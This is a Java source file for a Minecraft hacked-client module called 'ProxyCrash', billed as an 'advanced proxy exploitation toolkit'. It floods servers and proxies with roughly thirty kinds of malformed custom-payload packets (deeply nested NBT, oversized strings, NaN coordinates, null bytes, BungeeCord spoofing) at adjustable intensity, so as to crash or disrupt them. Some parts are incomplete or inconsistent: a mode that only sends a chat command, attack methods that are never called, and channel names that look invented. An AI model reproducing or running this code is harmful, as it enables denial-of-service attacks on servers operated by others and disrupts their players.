package dev.revere.valance.module.impl.misc;

import com.google.common.base.Strings;
import dev.revere.valance.ClientLoader;
import dev.revere.valance.event.annotation.Subscribe;
import dev.revere.valance.event.type.game.ClientTickEvent;
import dev.revere.valance.event.type.packet.PacketEvent;
import dev.revere.valance.module.Category;
import dev.revere.valance.module.annotation.ModuleInfo;
import dev.revere.valance.module.api.AbstractModule;
import dev.revere.valance.properties.Property;
import dev.revere.valance.service.IEventBusService;
import dev.revere.valance.util.MinecraftUtil;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomUtils;

import java.util.Arrays;
import java.util.UUID;

/**
 * @author Remi
 * @project valance
 * @date 4/28/2025
 */
@ModuleInfo(name = "ProxyCrash", displayName = "Proxy Crasher", description = "Advanced proxy exploitation toolkit", category = Category.MISC)
public class ProxyCrashModule extends AbstractModule {

    private enum AttackMode {
        NONE("None"),
        INVALID_ENUM("Invalid Enum Values"),
        MALFORMED_NBT("Malformed NBT Data"),
        NEGATIVE_ARRAYS("Negative Array Sizes"),
        NAN_VALUES("NaN/Infinity Values"),
        CHUNK_BAN("Chunk Ban"),
        ENTITY_FLOOD("Entity Spawn Flood"),
        BOOK_FLOOD("Book Page Flood"),
        TAB_COMPLETE("Tab Complete Spam"),
        UUID_COLLISION("UUID Collision"),
        FAKE_SERVER("Fake Server Switch"),
        KEEPALIVE_FLOOD("KeepAlive Flood"),
        TRANSACTION_DESYNC("Transaction Desync"),
        NULL_BYTE("Null Byte Injection"),
        ANSI_FLOOD("ANSI Escape Flood"),
        NESTED_JSON("Nested JSON"),
        INVALID_UTF8("Invalid UTF-8"),
        EXTREME_COORDS("Extreme Coordinates"),
        NAN_POSITION("NaN Position"),
        VEHICLE_TELEPORT("Vehicle Teleport"),
        NEGATIVE_SLOTS("Negative Slot IDs"),
        INVALID_STACKS("Invalid Stack Sizes"),
        CREATIVE_SPAM("Creative Action Spam"),
        OVERSIZED_PAYLOADS("Oversized Payloads"),
        INVALID_CHANNELS("Invalid Channel Names"),
        BUNGEE_SPOOF("BungeeCord Spoof"),
        INFINITY_HEALTH("Infinity Health"),
        INVALID_ENTITIES("Invalid Entity IDs"),
        INVALID_HASH("Resource Pack Hash"),
        SPECTATE_TP("Spectate Teleport");

        private final String description;

        AttackMode(String description) {
            this.description = description;
        }

        @Override
        public String toString() {
            return this.description;
        }
    }

    private final Property<AttackMode> attackMode = new Property<>("Mode", AttackMode.NONE);

    private final Property<Integer> intensity = new Property<>("Intensity", 100)
            .minimum(1)
            .maximum(500)
            .visibleWhen(() -> attackMode.getValue() != AttackMode.NONE);

    private final Property<Boolean> autoRotate = new Property<>("Auto-Rotate", false)
            .visibleWhen(() -> attackMode.getValue() != AttackMode.NONE);

    private final Property<Boolean> bypassMode = new Property<>("Bypass", true);

    private long lastAttackTime = 0L;

    public ProxyCrashModule(IEventBusService eventBusService) {
        super(eventBusService);
    }

    @Override
    public void onEnable() {
        super.onEnable();
        lastAttackTime = System.currentTimeMillis();
        log("Enabled with mode: " + attackMode.getValue());
    }

    @Override
    public void onDisable() {
        super.onDisable();
    }

    @Subscribe
    public void onTick(ClientTickEvent event) {
        if (!isEnabled() || attackMode.getValue() == AttackMode.NONE) return;

        long now = System.currentTimeMillis();
        if (now - lastAttackTime >= 1000L) {
            lastAttackTime = now;
            executeAttack();

            if (autoRotate.getValue()) {
                rotateAttackMode();
            }
        }
    }

    private void executeAttack() {
        AttackMode currentAttack = attackMode.getValue();
        int packetsToSend = Math.max(1, intensity.getValue() * 5);

        try {
            switch (currentAttack) {
                case INVALID_ENUM:
                    sendInvalidEnum(packetsToSend);
                    break;
                case MALFORMED_NBT:
                    sendMalformedNBT(packetsToSend);
                    break;
                case NEGATIVE_ARRAYS:
                    sendNegativeArrays(packetsToSend);
                    break;
                case NAN_VALUES:
                    sendNaNValues(packetsToSend);
                    break;
                case CHUNK_BAN:
                    sendChunkBan(packetsToSend);
                    break;
                case ENTITY_FLOOD:
                    sendEntityFlood(packetsToSend);
                    break;
                case BOOK_FLOOD:
                    break;
                case TAB_COMPLETE:
                    sendTabCompleteSpam(packetsToSend);
                    break;
                case UUID_COLLISION:
                    sendUuidCollision(packetsToSend);
                    break;
                case FAKE_SERVER:
                    sendFakeServerSwitch(packetsToSend);
                    break;
                case KEEPALIVE_FLOOD:
                    sendKeepAliveFlood(packetsToSend);
                    break;
                case TRANSACTION_DESYNC:
                    sendTransactionDesync(packetsToSend);
                    break;
                case NULL_BYTE:
                    sendNullByteInjection(packetsToSend);
                    break;
                case ANSI_FLOOD:
                    sendAnsiEscapeFlood(packetsToSend);
                    break;
                case NESTED_JSON:
                    sendNestedJson(packetsToSend);
                    break;
                case INVALID_UTF8:
                    sendInvalidUTF8(packetsToSend);
                    break;
                case EXTREME_COORDS:
                    sendExtremeCoords(packetsToSend);
                    break;
                case NAN_POSITION:
                    sendNaNPosition(packetsToSend);
                    break;
                case VEHICLE_TELEPORT:
                    sendVehicleTeleport(packetsToSend);
                    break;
                case NEGATIVE_SLOTS:
                    sendNegativeSlots(packetsToSend);
                    break;
                case INVALID_STACKS:
                    sendInvalidStackSizes(packetsToSend);
                    break;
                case CREATIVE_SPAM:
                    sendCreativeSpam(packetsToSend);
                    break;
                case OVERSIZED_PAYLOADS:
                    break;
                case INVALID_CHANNELS:
                    sendInvalidChannels(packetsToSend);
                    break;
                case BUNGEE_SPOOF:
                    sendBungeeSpoof(packetsToSend);
                    break;
                case INFINITY_HEALTH:
                    sendInfinityHealth(packetsToSend);
                    break;
                case INVALID_ENTITIES:
                    sendInvalidEntities(packetsToSend);
                    break;
                case INVALID_HASH:
                    sendInvalidHash(packetsToSend);
                    break;
                case SPECTATE_TP:
                    sendSpectateTeleport(packetsToSend);
                    break;
            }
            log("Executed " + currentAttack + " (x" + packetsToSend + ")");
        } catch (Exception e) {
            logError("Attack failed: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    // Attack implementations
    private void sendInvalidEnum(int count) {
        double playerX;
        double playerY;
        double playerZ;
        double y;
        double x;
        double z;
        char[] letters = new char[]{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'v', 'w', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};

        String command = "joinqueue " + RandomUtils.nextInt(1, 4096);
        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
        buffer.writeString(command);
        mc.thePlayer.sendChatMessage("/" + command);
    }

    private void sendMalformedNBT(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            NBTTagCompound root = new NBTTagCompound();
            NBTTagCompound current = root;
            for (int j = 0; j < 50; j++) {
                NBTTagCompound next = new NBTTagCompound();
                current.setTag("nested", next);
                current = next;
            }
            buffer.writeNBTTagCompoundToBuffer(root);
            sendPayload("MC|BEdit", buffer);
        }
    }

    private void sendNegativeArrays(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeVarIntToBuffer(-1);
            sendPayload("MC|BSign", buffer);
        }
    }

    private void sendNaNValues(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeDouble(Double.NaN);
            buffer.writeDouble(Double.POSITIVE_INFINITY);
            buffer.writeDouble(Double.NEGATIVE_INFINITY);
            sendPayload("MC|BEdit", buffer);
        }
    }

    private void sendChunkBan(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeInt(Integer.MAX_VALUE);
            buffer.writeInt(Integer.MAX_VALUE);
            buffer.writeBoolean(true);
            sendPayload("MC|ChunkLoad", buffer);
        }
    }

    private void sendEntityFlood(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeVarIntToBuffer(Integer.MAX_VALUE);
            buffer.writeByte(0);
            buffer.writeInt((int) (mc.thePlayer.posX * 32.0D));
            buffer.writeInt((int) (mc.thePlayer.posY * 32.0D));
            buffer.writeInt((int) (mc.thePlayer.posZ * 32.0D));
            sendPayload("MC|EntFlood", buffer);
        }
    }

    private void sendBookFlood(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            NBTTagList pages = new NBTTagList();
            for (int j = 0; j < 100; j++) {
                pages.appendTag(new NBTTagString(Strings.repeat("A", 32767)));
            }
            NBTTagCompound book = new NBTTagCompound();
            book.setTag("pages", pages);
            buffer.writeNBTTagCompoundToBuffer(book);
            sendPayload("MC|BEdit", buffer);
        }
    }

    private void sendTabCompleteSpam(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString(Strings.repeat("/", 32767));
            sendPayload("MC|TabComplete", buffer);
        }
    }

    private void sendUuidCollision(int count) {
        UUID fakeUuid = UUID.randomUUID();
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeUuid(fakeUuid);
            buffer.writeString("Player" + i);
            sendPayload("MC|UUID", buffer);
        }
    }

    private void sendFakeServerSwitch(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString(Strings.repeat("\0", 255));
            sendPayload("MC|ServerSwitch", buffer);
        }
    }

    private void sendKeepAliveFlood(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeLong(Long.MAX_VALUE);
            sendPayload("MC|KeepAlive", buffer);
        }
    }

    private void sendTransactionDesync(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeByte(-1);
            buffer.writeShort(Short.MAX_VALUE);
            buffer.writeBoolean(true);
            sendPayload("MC|TrSel", buffer);
        }
    }

    private void sendNullByteInjection(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString("Sign\0Text\0Injection\0");
            sendPayload("MC|Sign", buffer);
        }
    }

    private void sendAnsiEscapeFlood(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString("\u001b[31m" + Strings.repeat("COLORED_SPAM", 100));
            sendPayload("MC|Chat", buffer);
        }
    }

    private void sendNestedJson(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            String json = createDeepJson(50);
            buffer.writeString(json);
            sendPayload("MC|Json", buffer);
        }
    }

    private String createDeepJson(int depth) {
        if (depth <= 0) return "\"end\"";
        return "{\"nested\":" + createDeepJson(depth - 1) + "}";
    }

    private void sendInvalidUTF8(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            byte[] invalidUtf8 = {(byte) 0xC0, (byte) 0x80};
            buffer.writeBytes(invalidUtf8);
            sendPayload("MC|InvalidUTF8", buffer);
        }
    }

    private void sendExtremeCoords(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeDouble(Double.MAX_VALUE);
            buffer.writeDouble(Double.MAX_VALUE);
            buffer.writeDouble(Double.MAX_VALUE);
            sendPayload("MC|Pos", buffer);
        }
    }

    private void sendNaNPosition(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeDouble(Double.NaN);
            buffer.writeDouble(Double.NaN);
            buffer.writeDouble(Double.NaN);
            sendPayload("MC|Pos", buffer);
        }
    }

    private void sendVehicleTeleport(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeInt(Integer.MAX_VALUE); // Invalid vehicle ID
            buffer.writeDouble(mc.thePlayer.posX);
            buffer.writeDouble(mc.thePlayer.posY);
            buffer.writeDouble(mc.thePlayer.posZ);
            sendPayload("MC|Vehicle", buffer);
        }
    }

    private void sendNegativeSlots(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeByte(-1);
            buffer.writeShort(-1);
            buffer.writeByte(0);
            buffer.writeShort(0);
            buffer.writeByte(0);
            sendPayload("MC|Click", buffer);
        }
    }

    private void sendInvalidStackSizes(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeByte(127);
            sendPayload("MC|Stack", buffer);
        }
    }

    private void sendCreativeSpam(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeShort(Short.MAX_VALUE);
            buffer.writeNBTTagCompoundToBuffer(new NBTTagCompound());
            sendPayload("MC|Creative", buffer);
        }
    }

    private void sendOversizedPayloads(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            byte[] largePayload = new byte[32000];
            Arrays.fill(largePayload, (byte) 0xFF);
            buffer.writeBytes(largePayload);
            sendPayload("MC|LargePayload", buffer);
        }
    }

    private void sendInvalidChannels(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString("INVALID|CHANNEL|\uFFFF");
            sendPayload("INVALID|CHANNEL|\uFFFF", buffer);
        }
    }

    private void sendBungeeSpoof(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString("BungeeCord");
            buffer.writeString("IP|1.1.1.1|" + Strings.repeat("A", 1000));
            sendPayload("BungeeCord", buffer);
        }
    }

    private void sendInfinityHealth(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeFloat(Float.POSITIVE_INFINITY);
            sendPayload("MC|Health", buffer);
        }
    }

    private void sendInvalidEntities(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeInt(Integer.MAX_VALUE);
            buffer.writeByte(0);
            buffer.writeByte(0);
            buffer.writeFloat(0);
            sendPayload("MC|EntityMeta", buffer);
        }
    }

    private void sendInvalidHash(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString(Strings.repeat("A", 40));
            sendPayload("MC|RPackHash", buffer);
        }
    }

    private void sendSpectateTeleport(int count) {
        for (int i = 0; i < count; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeUuid(new UUID(0, 0));
            sendPayload("MC|Spectate", buffer);
        }
    }

    private void rotateAttackMode() {
        AttackMode[] modes = AttackMode.values();
        int nextOrdinal = (attackMode.getValue().ordinal() + 1) % modes.length;
        if (nextOrdinal == 0) nextOrdinal = 1;
        attackMode.setValue(modes[nextOrdinal]);
    }


    private void sendPayload(String channel, PacketBuffer buffer) {
        if (mc.getNetHandler() != null) {
            mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(channel, buffer));
        }
    }

    private void log(String message) {
        MinecraftUtil.sendClientMessage("[" + ClientLoader.CLIENT_NAME + ":ProxyCrash] " + message);
    }

    private void logError(String message) {
        MinecraftUtil.sendClientMessage("[" + ClientLoader.CLIENT_NAME + ":ProxyCrash] " + message);
    }

    @Subscribe
    public void onPacket(PacketEvent event) {
        if (!isEnabled() || event.getEventState() != PacketEvent.EventState.RECEIVING) return;
    }
}